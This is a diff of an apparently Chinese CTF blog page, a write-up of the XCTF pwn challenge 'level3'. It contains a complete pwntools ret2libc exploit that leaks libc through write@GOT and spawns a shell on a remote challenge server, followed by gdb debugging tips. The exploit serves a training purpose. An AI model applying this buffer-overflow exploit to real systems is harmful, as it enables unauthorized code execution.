@@ -14,25 +14,25 @@
     
     
     
-    <title>xctf-pwn-level3 | faint-star</title>
+    <title>level3 | faint-star</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
     <meta name="theme-color" content="#3F51B5">
     
     
-    <meta name="keywords" content="stack">
-    <meta name="description" content="level3漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者123456789```c++ssize_t vulnerable_function()&amp;#123;  char buf; // [esp+0h] [ebp-88h]  write(1, &amp;quot;Input:\n&amp;quot;, 7u);  return read(0, &amp;amp;buf, 256u);&amp;#125; e">
-<meta name="keywords" content="stack">
+    <meta name="keywords" content="stack,xctf">
+    <meta name="description" content="level3漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者/bin/sh字符串，考察的是libc泄露的基本操作 1234567ssize_t vulnerable_function()&amp;#123;  char buf; // [esp+0h] [ebp-88h]  write(1, &quot;Input:\n&quot;, 7u);  return read(0, &amp;amp;buf, 256u)">
+<meta name="keywords" content="stack,xctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xctf-pwn-level3">
+<meta property="og:title" content="level3">
 <meta property="og:url" content="http://yoursite.com/2019/08/15/XCTF-PWN/index.html">
 <meta property="og:site_name" content="faint-star">
-<meta property="og:description" content="level3漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者123456789```c++ssize_t vulnerable_function()&amp;#123;  char buf; // [esp+0h] [ebp-88h]  write(1, &amp;quot;Input:\n&amp;quot;, 7u);  return read(0, &amp;amp;buf, 256u);&amp;#125; e">
+<meta property="og:description" content="level3漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者/bin/sh字符串，考察的是libc泄露的基本操作 1234567ssize_t vulnerable_function()&amp;#123;  char buf; // [esp+0h] [ebp-88h]  write(1, &quot;Input:\n&quot;, 7u);  return read(0, &amp;amp;buf, 256u)">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-08-20T14:05:49.073Z">
+<meta property="og:updated_time" content="2019-08-20T15:39:20.135Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xctf-pwn-level3">
-<meta name="twitter:description" content="level3漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者123456789```c++ssize_t vulnerable_function()&amp;#123;  char buf; // [esp+0h] [ebp-88h]  write(1, &amp;quot;Input:\n&amp;quot;, 7u);  return read(0, &amp;amp;buf, 256u);&amp;#125; e">
+<meta name="twitter:title" content="level3">
+<meta name="twitter:description" content="level3漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者/bin/sh字符串，考察的是libc泄露的基本操作 1234567ssize_t vulnerable_function()&amp;#123;  char buf; // [esp+0h] [ebp-88h]  write(1, &quot;Input:\n&quot;, 7u);  return read(0, &amp;amp;buf, 256u)">
     
         <link rel="alternate" type="application/atom+xml" title="faint-star" href="/atom.xml">
     
@@ -113,7 +113,7 @@
         <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
           <i class="icon icon-lg icon-navicon"></i>
         </a>
-        <div class="flex-col header-title ellipsis">xctf-pwn-level3</div>
+        <div class="flex-col header-title ellipsis">level3</div>
         
         <div class="search-wrap" id="search-wrap">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
@@ -135,7 +135,7 @@
 <header class="content-header post-header">
 
     <div class="container fade-scale">
-        <h1 class="title">xctf-pwn-level3</h1>
+        <h1 class="title">level3</h1>
         <h5 class="subtitle">
             
                 <time datetime="2019-08-15T14:34:34.000Z" itemprop="datePublished" class="page-time">
@@ -167,7 +167,7 @@
   class="post-article article-type-post fade" itemprop="blogPost">
 
     <div class="post-card">
-        <h1 class="post-card-title">xctf-pwn-level3</h1>
+        <h1 class="post-card-title">level3</h1>
         <div class="post-meta">
             <time class="post-time" title="2019-08-15 22:34:34" datetime="2019-08-15T14:34:34.000Z"  itemprop="datePublished">2019-08-15</time>
 
@@ -182,13 +182,20 @@
 
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
-            <h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```c++</span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  write(1, &quot;Input:\n&quot;, 7u);</span><br><span class="line">  return read(0, &amp;buf, 256u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+            <h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者<code>/bin/sh</code>字符串，考察的是libc泄露的基本操作</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">256u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p><strong>exp:</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = cyclic(0x100)</span></span><br><span class="line">io = process(<span class="string">'./level3'</span>)</span><br><span class="line">io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">45330</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr = <span class="number">0x08048484</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="number">0x8c</span>*<span class="string">'a'</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">'write:'</span>+hex(write))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"write"</span>, write)</span><br><span class="line">system = write + obj.dump(<span class="string">"system"</span>) - obj.dump(<span class="string">"write"</span>)      <span class="comment">#system offset</span></span><br><span class="line">bin_sh = write + obj.dump(<span class="string">"str_bin_sh"</span>) - obj.dump(<span class="string">"write"</span>)   <span class="comment">#/bin/sh offset</span></span><br><span class="line">info(<span class="string">'system:'</span>+hex(system))</span><br><span class="line">info(<span class="string">'/bin/sh:'</span>+hex(bin_sh))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0x8c</span>*<span class="string">'b'</span>+p32(system)+p32(main_addr)+p32(bin_sh)</span><br><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><strong>调试技巧:</strong></p>
-<p>在read处按下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">断点下在 ```0x08048482``` 处</span><br><span class="line"></span><br><span class="line">```assembly</span><br><span class="line">.text:08048482                 leave</span><br><span class="line">.text:08048483                 retn</span><br></pre></td></tr></table></figure></p>
-<p>python里加上调试语句，python脚本运行时会自动打开<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line"># gdb.attach(io)</span><br></pre></td></tr></table></figure></p>
+<p>在read处按下<code>Tab</code>键找到地址</p>
+<p>断点下在 <code>0x08048482</code> 处</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048482                 leave</span><br><span class="line">.text:08048483                 retn</span><br></pre></td></tr></table></figure>
+
+<p>python里加上调试语句，python脚本运行时会自动打开<code>gdb</code>进行调试。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdb.attach(io)</span></span><br></pre></td></tr></table></figure>
+
 <p>但由于收发速度不同，我们需要在每次发送数据前加上pause，这样就可以让<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line">io.recvuntil(&apos;Input:\n&apos;)</span><br><span class="line"># pause()</span><br><span class="line">io.sendline(payload1)</span><br></pre></td></tr></table></figure></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload2)</span><br></pre></td></tr></table></figure>
 
@@ -201,7 +208,7 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2019-08-20T14:05:49.073Z" itemprop="dateUpdated">2019-08-20 22:05:49</time>
+    Last updated: <time datetime="2019-08-20T15:39:20.135Z" itemprop="dateUpdated">2019-08-20 23:39:20</time>
 </span><br>
 
 
@@ -221,7 +228,7 @@
 
         <div class="post-footer">
             
-	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/">stack</a></li></ul>
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/">stack</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xctf/">xctf</a></li></ul>
 
 
             
@@ -231,7 +238,7 @@
 <div class="page-share" id="pageShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/08/15/XCTF-PWN/&title=《xctf-pwn-level3》 — faint-star&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/08/15/XCTF-PWN/&title=《level3》 — faint-star&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -241,7 +248,7 @@
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/08/15/XCTF-PWN/&title=《xctf-pwn-level3》 — faint-star&source=" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/08/15/XCTF-PWN/&title=《level3》 — faint-star&source=" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -251,7 +258,7 @@
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《xctf-pwn-level3》 — faint-star&url=http://yoursite.com/2019/08/15/XCTF-PWN/&via=http://yoursite.com" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《level3》 — faint-star&url=http://yoursite.com/2019/08/15/XCTF-PWN/&via=http://yoursite.com" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
@@ -276,7 +283,14 @@
     </div>
 
     
-<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/08/20/dice-game/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">dice-game</h4>
+      </a>
+    </div>
   
 
   
@@ -357,7 +371,7 @@
 <div class="global-share" id="globalShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/08/15/XCTF-PWN/&title=《xctf-pwn-level3》 — faint-star&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/08/15/XCTF-PWN/&title=《level3》 — faint-star&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -367,7 +381,7 @@
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/08/15/XCTF-PWN/&title=《xctf-pwn-level3》 — faint-star&source=" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/08/15/XCTF-PWN/&title=《level3》 — faint-star&source=" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -377,7 +391,7 @@
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《xctf-pwn-level3》 — faint-star&url=http://yoursite.com/2019/08/15/XCTF-PWN/&via=http://yoursite.com" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《level3》 — faint-star&url=http://yoursite.com/2019/08/15/XCTF-PWN/&via=http://yoursite.com" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
